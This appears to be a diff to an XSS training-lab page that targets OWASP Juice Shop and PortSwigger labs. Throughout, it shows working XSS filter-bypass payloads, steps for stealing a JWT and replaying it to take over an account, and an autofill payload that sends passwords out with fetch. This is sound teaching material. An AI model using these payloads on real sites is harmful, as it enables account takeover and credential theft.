@@ -67,7 +67,7 @@
           <div class="comparison-grid" style="margin:0;">
             <div class="comparison-card comparison-card--cyan">
               <div class="comparison-card__header">
-                <h3 class="comparison-card__title">On Twitter.com: Escaped (Safe)</h3>
+                <h3 class="comparison-card__title" id="tweetdeck-escaped">On Twitter.com: Escaped (Safe)</h3>
                 <span class="comparison-badge" style="color:var(--color-cyan);">printed as words</span>
               </div>
               <figure style="margin:var(--space-2) 0;">
@@ -79,7 +79,7 @@
             </div>
             <div class="comparison-card comparison-card--accent">
               <div class="comparison-card__header">
-                <h3 class="comparison-card__title">On TweetDeck: Unescaped (XSS)</h3>
+                <h3 class="comparison-card__title" id="tweetdeck-xss">On TweetDeck: Unescaped (XSS)</h3>
                 <span class="comparison-badge" style="color:var(--color-accent);">ran as code</span>
               </div>
               <figure style="margin:var(--space-2) 0;">
@@ -156,22 +156,22 @@
         <div class="comparison-grid">
           <div class="comparison-card comparison-card--cyan">
             <div class="comparison-card__header">
-              <h3 class="comparison-card__title">Cookie with <code>HttpOnly</code> Flag</h3>
+              <h3 class="comparison-card__title" id="cookie-httponly">Cookie with <code>HttpOnly</code> Flag</h3>
               <span class="comparison-badge" style="color:var(--color-cyan);">hidden from JS</span>
             </div>
             <ul class="comparison-list">
-              <li><span class="comparison-icon">🍪</span> When the server sets <code>Set-Cookie: token=…; HttpOnly</code>, the browser still sends the cookie on every request, but hides it completely from <code>document.cookie</code>.</li>
-              <li><span class="comparison-icon">🛡️</span> An XSS payload can still click buttons as you (like TweetDeck), but it can't read the raw token string and walk out the door with it.</li>
+              <li>When the server sets <code>Set-Cookie: token=…; HttpOnly</code>, the browser still sends the cookie on every request, but hides it completely from <code>document.cookie</code>.</li>
+              <li>An XSS payload can still click buttons as you (like TweetDeck), yet it can't read the raw token string and walk out the door with it.</li>
             </ul>
           </div>
           <div class="comparison-card comparison-card--accent">
             <div class="comparison-card__header">
-              <h3 class="comparison-card__title"><code>localStorage</code> or Cookie without <code>HttpOnly</code></h3>
+              <h3 class="comparison-card__title" id="localstorage-no-httponly"><code>localStorage</code> or Cookie without <code>HttpOnly</code></h3>
               <span class="comparison-badge" style="color:var(--color-accent);">wide open to JS</span>
             </div>
             <ul class="comparison-list">
-              <li><span class="comparison-icon">📖</span> <code>localStorage</code> has no <code>HttpOnly</code> flag at all, and any cookie set without <code>HttpOnly</code> shows right up inside <code>document.cookie</code>.</li>
-              <li><span class="comparison-icon">💥</span> In Juice Shop, both are exposed: calling <code>localStorage.getItem('token')</code> (or <code>document.cookie</code>) hands the entire JWT session to your script in one line.</li>
+              <li><code>localStorage</code> has no <code>HttpOnly</code> flag at all, and any cookie set without <code>HttpOnly</code> shows right up inside <code>document.cookie</code>.</li>
+              <li>In Juice Shop, both are exposed: calling <code>localStorage.getItem('token')</code> (or <code>document.cookie</code>) hands the entire JWT session to your script in one line.</li>
             </ul>
           </div>
         </div>
@@ -277,7 +277,7 @@
         <div class="comparison-grid" style="margin-bottom:var(--space-4);">
           <div class="comparison-card comparison-card--cyan">
             <div class="comparison-card__header">
-              <h3 class="comparison-card__title">Why <code>&lt;script&gt;</code> fails in <code>innerHTML</code></h3>
+              <h3 class="comparison-card__title" id="why-script-fails-innerhtml">Why <code>&lt;script&gt;</code> fails in <code>innerHTML</code></h3>
               <span class="comparison-badge" style="color:var(--color-cyan);">blocked by HTML5 spec</span>
             </div>
             <div class="terminal-window" style="margin:var(--space-2) 0;">
@@ -289,7 +289,7 @@
           </div>
           <div class="comparison-card comparison-card--accent">
             <div class="comparison-card__header">
-              <h3 class="comparison-card__title">Why <code>&lt;img onerror=…&gt;</code> works</h3>
+              <h3 class="comparison-card__title" id="why-img-onerror-works">Why <code>&lt;img onerror=…&gt;</code> works</h3>
               <span class="comparison-badge" style="color:var(--color-accent);">fires immediately</span>
             </div>
             <div class="terminal-window" style="margin:var(--space-2) 0;">
@@ -306,7 +306,7 @@
             <div class="target-launcher__title-group">
               <span class="target-launcher__icon">🧃</span>
               <div>
-                <h3 class="target-launcher__title">OWASP Juice Shop</h3>
+                <h3 class="target-launcher__title" id="target-juice-shop-card">OWASP Juice Shop</h3>
                 <div class="target-launcher__platform">Same container as Lab 02 and 03. If it's still running, skip straight to the browser.</div>
               </div>
             </div>
@@ -376,12 +376,12 @@
             <span class="comparison-badge" style="color:var(--color-accent);">Account Takeover</span>
           </div>
           <ol style="font-size:var(--font-size-sm);color:var(--color-text-secondary);padding-left:var(--space-4);margin:0;display:flex;flex-direction:column;gap:var(--space-2);">
-            <li>Make sure you're logged into Juice Shop first (use your account or last week's <code>' OR 1=1--</code> login bypass) so there is a live session token in the browser.</li>
+            <li>Make sure you're logged into Juice Shop first (use your account or last week's <code>' OR 1=1--</code> login bypass) so there's a live session token in the browser.</li>
             <li>Combine the <code>&lt;img src=x onerror=…&gt;</code> trigger from Step 1 with <code>localStorage.getItem('token')</code> (or <code>document.cookie</code>) from Section 1. Fill in the blank and run it in the search box:
               <div class="terminal-window" style="margin:var(--space-1) 0 0;"><div class="terminal-window__body"><pre><code>&lt;img src=x onerror="alert( ______ )"&gt;</code></pre></div></div>
             </li>
             <li>The alert pops with the victim's JWT string starting with <code>eyJ0eXAiOiJKV1Qi…</code>. Copy that entire JWT string.</li>
-            <li>Open a brand-new <strong>Incognito / Private</strong> window and go to <code>http://localhost:3000</code>. Click <strong>Account</strong> in the top bar to confirm you are logged out.</li>
+            <li>Open a brand-new <strong>Incognito / Private</strong> window and go to <code>http://localhost:3000</code>. Click <strong>Account</strong> in the top bar to confirm you're logged out.</li>
             <li>In that Incognito window, press <kbd>F12</kbd> → <strong>Console</strong>, paste your stolen JWT into both places Juice Shop checks, and press <kbd>Enter</kbd>:
               <div class="terminal-window" style="margin:var(--space-1) 0 0;">
                 <div class="terminal-window__header"><span class="terminal-window__title">Incognito DevTools Console (F12)</span></div>
@@ -389,7 +389,7 @@
 document.cookie = 'token=PASTE_STOLEN_JWT_HERE';</code></pre></div>
               </div>
             </li>
-            <li>Refresh the Incognito page (<kbd>F5</kbd>) and click <strong>Account</strong>. You are now logged in as the victim (with their email displayed right at the top of the menu) with no password and no login prompt.</li>
+            <li>Refresh the Incognito page (<kbd>F5</kbd>) and click <strong>Account</strong>. You're now logged in as the victim (with their email displayed right at the top of the menu) with no password and no login prompt.</li>
           </ol>
           <details class="thought-accordion" style="margin-top:var(--space-3);">
             <summary>Need the exact payload for line 2? (Plus a zero-quote JS trick)</summary>
@@ -426,7 +426,7 @@ document.cookie = 'token=PASTE_STOLEN_JWT_HERE';</code></pre></div>
         </div>
 
         <div class="prediction-prompt" style="margin-top:var(--space-4);">
-          <div class="prediction-prompt__question">🤔 Suppose a developer fixes the session by storing it ONLY in an <code>HttpOnly</code> cookie and deleting <code>localStorage.token</code>. Now <code>document.cookie</code> is empty and you cannot steal the token. Your XSS still runs inside the victim's browser. How do you still read their private account data or perform actions as them?</div>
+          <div class="prediction-prompt__question">🤔 Suppose a developer fixes the session by storing it ONLY in an <code>HttpOnly</code> cookie and deleting <code>localStorage.token</code>. Now <code>document.cookie</code> is empty and you can't steal the token. Your XSS still runs inside the victim's browser. How do you still read their private account data or perform actions as them?</div>
           <div class="prediction-prompt__input-group">
             <input type="text" class="prediction-prompt__input" placeholder="Your guess…" />
             <button type="button" class="prediction-prompt__btn">Reveal</button>
@@ -470,7 +470,7 @@ document.cookie = 'token=PASTE_STOLEN_JWT_HERE';</code></pre></div>
         <div class="comparison-grid" style="margin-bottom:var(--space-4);">
           <div class="comparison-card comparison-card--cyan">
             <div class="comparison-card__header">
-              <h3 class="comparison-card__title">Scenario A: <code>&lt; &gt;</code> NOT Encoded</h3>
+              <h3 class="comparison-card__title" id="scenario-a-unencoded">Scenario A: <code>&lt; &gt;</code> NOT Encoded</h3>
               <span class="comparison-badge" style="color:var(--color-cyan);">Lab #1 &amp; #2</span>
             </div>
             <div class="terminal-window" style="margin:var(--space-2) 0;">
@@ -487,7 +487,7 @@ document.cookie = 'token=PASTE_STOLEN_JWT_HERE';</code></pre></div>
 
           <div class="comparison-card comparison-card--accent">
             <div class="comparison-card__header">
-              <h3 class="comparison-card__title">Scenario B: <code>&lt; &gt;</code> Encoded</h3>
+              <h3 class="comparison-card__title" id="scenario-b-encoded">Scenario B: <code>&lt; &gt;</code> Encoded</h3>
               <span class="comparison-badge" style="color:var(--color-accent);">Lab #3</span>
             </div>
             <div class="terminal-window" style="margin:var(--space-2) 0;">
@@ -539,17 +539,44 @@ document.cookie = 'token=PASTE_STOLEN_JWT_HERE';</code></pre></div>
                 <tr>
                   <td><strong>No Spaces (<code> </code>)</strong><br /><span style="font-size:var(--font-size-xs);color:var(--color-text-muted);">Strips or blocks whitespace</span></td>
                   <td>The HTML5 tokenizer treats <code>/</code> after a tag name or after a quoted attribute (<code>"x"/</code>) as whitespace. <em>(Why quote <code>"x"</code>? Without quotes, the browser thinks <code>/onerror</code> is a folder path inside <code>src=x/onerror</code>!)</em></td>
-                  <td><code>&lt;img/src="x"/onerror=alert(document.domain)&gt;</code></td>
+                  <td>
+                    <div class="code-copy-inline" style="display:flex;align-items:center;justify-content:space-between;width:100%;">
+                      <code style="word-break:break-all;white-space:normal;font-size:0.75rem;">&lt;img/src="x"/onerror=alert(document.domain)&gt;</code>
+                      <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('<img/src=&quot;x&quot;/onerror=alert(document.domain)>')">Copy</button>
+                    </div>
+                  </td>
                 </tr>
                 <tr>
                   <td><strong>No Parentheses (<code>( )</code>)</strong><br /><span style="font-size:var(--font-size-xs);color:var(--color-text-muted);">Blocks function calls like <code>alert(1)</code></span></td>
                   <td>ES6 <strong>Tagged Template Literals</strong> let you invoke any JavaScript function using backticks (<code>`…`</code>) instead of parentheses!</td>
-                  <td><code>&lt;img/src="x"/onerror=alert`1`&gt;</code><br /><span style="font-size:var(--font-size-xs);color:var(--color-text-muted);">or <code>&lt;details/open/ontoggle=alert`1`&gt;</code></span></td>
+                  <td>
+                    <div style="display:flex;flex-direction:column;gap:var(--space-1);width:100%;">
+                      <div class="code-copy-inline" style="display:flex;align-items:center;justify-content:space-between;width:100%;">
+                        <code style="word-break:break-all;white-space:normal;font-size:0.75rem;">&lt;img/src="x"/onerror=alert`1`&gt;</code>
+                        <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('<img/src=&quot;x&quot;/onerror=alert`1`>')">Copy</button>
+                      </div>
+                      <div class="code-copy-inline" style="display:flex;align-items:center;justify-content:space-between;width:100%;">
+                        <code style="word-break:break-all;white-space:normal;font-size:0.75rem;">&lt;details/open/ontoggle=alert`1`&gt;</code>
+                        <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('<details/open/ontoggle=alert`1`>')">Copy</button>
+                      </div>
+                    </div>
+                  </td>
                 </tr>
                 <tr>
                   <td><strong>No Quotes (<code>' "</code>)</strong><br /><span style="font-size:var(--font-size-xs);color:var(--color-text-muted);">Breaks <code>getItem('token')</code></span></td>
                   <td><code>localStorage</code> is a JS object, so dot notation (<code>localStorage.token</code>) reads the JWT with zero quotes. Pair with boolean <code>open</code> on <code>&lt;details&gt;</code> to need zero spaces too!</td>
-                  <td><code>&lt;img src=x onerror=alert(localStorage.token)&gt;</code><br /><span style="font-size:var(--font-size-xs);color:var(--color-text-muted);">or <code>&lt;details/open/ontoggle=alert(localStorage.token)&gt;</code></span></td>
+                  <td>
+                    <div style="display:flex;flex-direction:column;gap:var(--space-1);width:100%;">
+                      <div class="code-copy-inline" style="display:flex;align-items:center;justify-content:space-between;width:100%;">
+                        <code style="word-break:break-all;white-space:normal;font-size:0.75rem;">&lt;img src=x onerror=alert(localStorage.token)&gt;</code>
+                        <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('<img src=x onerror=alert(localStorage.token)>')">Copy</button>
+                      </div>
+                      <div class="code-copy-inline" style="display:flex;align-items:center;justify-content:space-between;width:100%;">
+                        <code style="word-break:break-all;white-space:normal;font-size:0.75rem;">&lt;details/open/ontoggle=alert(localStorage.token)&gt;</code>
+                        <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('<details/open/ontoggle=alert(localStorage.token)>')">Copy</button>
+                      </div>
+                    </div>
+                  </td>
                 </tr>
               </tbody>
             </table>
@@ -564,7 +591,7 @@ document.cookie = 'token=PASTE_STOLEN_JWT_HERE';</code></pre></div>
         <div class="comparison-grid" style="margin-bottom:var(--space-4);">
           <div class="comparison-card comparison-card--cyan">
             <div class="comparison-card__header">
-              <h3 class="comparison-card__title">Trap 1: <code>javascript:</code> Links</h3>
+              <h3 class="comparison-card__title" id="trap-javascript-links">Trap 1: <code>javascript:</code> Links</h3>
               <span class="comparison-badge" style="color:var(--color-cyan);">Lab #4</span>
             </div>
             <div class="terminal-window" style="margin:var(--space-2) 0;">
@@ -575,14 +602,14 @@ document.cookie = 'token=PASTE_STOLEN_JWT_HERE';</code></pre></div>
 &lt;a id="author" href="javascript:alert(1)"&gt;Alice&lt;/a&gt;</code></pre></div>
             </div>
             <ul class="comparison-list" style="margin-top:var(--space-2);">
-              <li><span class="comparison-icon">🔗</span> If an <code>href</code> starts with <code>javascript:</code> instead of <code>https://</code>, clicking the link runs that code on the page.</li>
-              <li><span class="comparison-icon">🛡️</span> <code>javascript:alert(1)</code> has <strong>zero <code>&lt;</code>, <code>&gt;</code>, or <code>"</code> characters</strong>, so HTML-encoding leaves it 100% untouched!</li>
+              <li>If an <code>href</code> starts with <code>javascript:</code> instead of <code>https://</code>, clicking the link runs that code on the page.</li>
+              <li><code>javascript:alert(1)</code> has <strong>zero <code>&lt;</code>, <code>&gt;</code>, or <code>"</code> characters</strong>, so HTML-encoding leaves it 100% untouched!</li>
             </ul>
           </div>
 
           <div class="comparison-card comparison-card--accent">
             <div class="comparison-card__header">
-              <h3 class="comparison-card__title">Trap 2: Autofill Password Theft</h3>
+              <h3 class="comparison-card__title" id="trap-autofill-theft">Trap 2: Autofill Password Theft</h3>
               <span class="comparison-badge" style="color:var(--color-accent);">steals password</span>
             </div>
             <div class="terminal-window" style="margin:var(--space-2) 0;">
@@ -592,14 +619,14 @@ document.cookie = 'token=PASTE_STOLEN_JWT_HERE';</code></pre></div>
   onchange="fetch('http://localhost:9000/?pw='+this.value)"&gt;</code></pre></div>
             </div>
             <ul class="comparison-list" style="margin-top:var(--space-2);">
-              <li><span class="comparison-icon">🔑</span> Browser password managers trust the domain (<code>localhost:3000</code>) and auto-fill any <code>&lt;input type="password"&gt;</code> on the page.</li>
-              <li><span class="comparison-icon">📡</span> Even if cookies are <code>HttpOnly</code>, <code>onchange</code> ships <code>this.value</code> (their saved plaintext password) to port <code>9000</code>!</li>
+              <li>Browser password managers trust the domain (<code>localhost:3000</code>) and auto-fill any <code>&lt;input type="password"&gt;</code> on the page.</li>
+              <li>Even if cookies are <code>HttpOnly</code>, <code>onchange</code> ships <code>this.value</code> (their saved plaintext password) to port <code>9000</code>!</li>
             </ul>
           </div>
         </div>
 
         <div class="prediction-prompt" style="margin-bottom:var(--space-4);">
-          <div class="prediction-prompt__question">🤔 Look at Trap 1 above. Since HTML-encoding <code>&lt;</code>, <code>&gt;</code>, and <code>"</code> does NOT stop <code>href="javascript:alert(1)"</code>, what simple check must a developer add before putting a user's Website URL into <code>&lt;a href="…"&gt;</code>?</div>
+          <div class="prediction-prompt__question">🤔 Look at Trap 1 above. Since HTML-encoding <code>&lt;</code>, <code>&gt;</code>, and <code>"</code> doesn't stop <code>href="javascript:alert(1)"</code>, what simple check must a developer add before putting a user's Website URL into <code>&lt;a href="…"&gt;</code>?</div>
           <div class="prediction-prompt__input-group">
             <input type="text" class="prediction-prompt__input" placeholder="Your guess…" />
             <button type="button" class="prediction-prompt__btn">Reveal</button>
@@ -615,7 +642,7 @@ document.cookie = 'token=PASTE_STOLEN_JWT_HERE';</code></pre></div>
             <div class="target-launcher__title-group">
               <span class="target-launcher__icon">🎓</span>
               <div>
-                <h3 class="target-launcher__title">PortSwigger Web Security Academy · Four Live Targets</h3>
+                <h3 class="target-launcher__title" id="target-portswigger-card">PortSwigger Web Security Academy · Four Live Targets</h3>
                 <div class="target-launcher__platform">Progress from basic reflection to attribute breakout and javascript: URI sinks</div>
               </div>
             </div>
@@ -666,7 +693,7 @@ document.cookie = 'token=PASTE_STOLEN_JWT_HERE';</code></pre></div>
         <div class="comparison-grid" style="margin-top:var(--space-2);">
           <div class="comparison-card comparison-card--accent">
             <div class="comparison-card__header">
-              <h3 class="comparison-card__title">💥 Vulnerable Code (Juice Shop)</h3>
+              <h3 class="comparison-card__title" id="xss-vulnerable-code">💥 Vulnerable Code (Juice Shop)</h3>
               <span class="comparison-badge" style="color:var(--color-danger);border-color:rgba(255,51,102,0.4);">escaping disabled</span>
             </div>
             <div class="terminal-window" style="margin:0;">
@@ -679,7 +706,7 @@ this.searchValue =
           </div>
           <div class="comparison-card comparison-card--cyan">
             <div class="comparison-card__header">
-              <h3 class="comparison-card__title">✅ Secure Code</h3>
+              <h3 class="comparison-card__title" id="xss-secure-code">✅ Secure Code</h3>
               <span class="comparison-badge" style="color:var(--color-cyan);border-color:rgba(0,229,255,0.4);">escaped by default</span>
             </div>
             <div class="terminal-window" style="margin:0;">
@@ -744,7 +771,7 @@ this.searchValue = query;
         </div>
 
         <div class="quiz-card" data-question-id="lab04-q5">
-          <div class="quiz-question">Q5: Your input reflects inside <code>&lt;input value="YOUR_INPUT"&gt;</code>. The server HTML-encodes <code>&lt;</code> and <code>&gt;</code>, but does NOT encode double quotes (<code>"</code>). How do you execute JavaScript?</div>
+          <div class="quiz-question">Q5: Your input reflects inside <code>&lt;input value="YOUR_INPUT"&gt;</code>. The server HTML-encodes <code>&lt;</code> and <code>&gt;</code>, but doesn't encode double quotes (<code>"</code>). How do you execute JavaScript?</div>
           <div class="quiz-options">
             <button type="button" class="quiz-option" data-correct="false" data-feedback="Since &lt; and &gt; are HTML-encoded into &amp;lt; and &amp;gt;, any new tag you type will just sit inside value=&quot;...&quot; as harmless text.">A) Type <code>&lt;svg onload=alert(1)&gt;</code> anyway.</button>
             <button type="button" class="quiz-option" data-correct="true" data-feedback="Exactly. Closing the double quote lets you step out of value=&quot;&quot; and attach an event handler directly onto the existing &lt;input&gt; element.">B) Close the attribute with <code>"</code> and inject an event handler on the existing input tag, like <code>" autofocus onfocus=alert(1) x="</code>.</button>
